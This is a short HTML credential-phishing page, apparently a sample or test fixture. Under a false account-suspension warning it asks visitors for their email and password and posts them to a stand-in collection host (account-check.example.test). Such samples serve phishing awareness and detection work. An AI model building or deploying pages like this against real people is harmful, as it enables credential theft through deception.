<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Example Account Login</title></head>
<body>
  <h1>Account access review</h1>
  <p>Your account access is at risk. Verify your identity now to avoid suspension.</p>
  <form action="https://account-check.example.test/collect" method="post">
    <label>Email <input type="email" name="email" autocomplete="off"></label>
    <label>Password <input type="password" name="password" autocomplete="off"></label>
    <button type="submit">Verify account</button>
  </form>
</body>
</html>
